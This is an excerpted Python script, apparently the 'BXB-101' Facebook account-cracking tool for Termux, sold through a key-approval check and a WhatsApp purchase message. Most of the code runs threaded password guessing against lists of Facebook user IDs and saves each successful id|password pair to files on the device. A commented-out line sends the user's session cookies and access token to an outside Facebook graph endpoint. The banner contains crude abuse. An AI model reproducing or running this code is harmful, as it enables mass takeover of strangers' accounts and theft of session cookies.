...
------------------------------------------------------
 Author    : YUNICK BAP
 Github    : UNIK DON
 Facebook  : Yunick Editz 
 For  Heater's  : AAUKAD MA BUS MUJI 😈
 \033[1;37mTool Name : \033[1;92mBXB-101
\033[1;37m------------------------------------------------------""")
...
def approval():
  ...
  print ("""\033[1;37m------------------------------------------------------""")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/UnikDon/APPROVEL-/main/APPROVEL.txt").text
    if id in httpCaht:
      animation("\033[1;97m >> CONGRATULATIONS YOUR KEY HAS BEEN APPROVED")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      animation("\x1b[1;97m >> SORRY YOUR KEY HAS NOT APPROVED ");
      time.sleep(0.1)
      input(' >> CLICK ENTER TO SEND YOUR KEY ')
      os.system('xdg-open https://www.facebook.com/profile.php?id=100078310630955')
      time.sleep(1)
      exit()
  except: 
     exit() 
...
#                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                ...
                linex()
                animation(' >> COOKIES LOGIN HAS BEEN SUCCESSFULLY...')
...
#https://graph.facebook.com/%s/friends?fields=id,name&limit=5000&access_token=
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print(" USE 4G DATA OR 5G WIFI FOR SPEED UP")
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                               ...
                               public()                      
                                ...
                                os.system(f'xdg-open https://www.facebook.com/profile.php?id=100078310630955');menu()
                                ...
                                if cpok in ['1','01']:
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/BXB-OK.txt', 'a')
                                    animation(' >> Opening BXB-OK.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/BXB-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/BXB-CP.txt', 'a')
                                    animation(' >> Opening BXB-CP.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/BXB-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=+9779803065851&text="

                        name = input(" [•] Enter your Name : ")

                        linex()

                        tks = ("Hi NIKHIL Sir, I Need To Buy Your Paid BXB PRO Tools Version 1.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python BXB.py')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [BXB-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        BXB=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in BXB:
                                ...
                                print('\r\r\033[1;32m [BXB-OK] %s | %s'%(ids,pas))

                                open('/sdcard/BXB-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in BXB:

                                if 'y' in pcp:

                                        print('\r\r\x1b\033[1;33m [BXB-CP] '+ids+' | '+pas+'\033[1;33m')

                                        open('/sdcard/BXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/BXB-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [BXB-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/BXB-OK.txt','a').write(uid+'|'+pas+'\n')
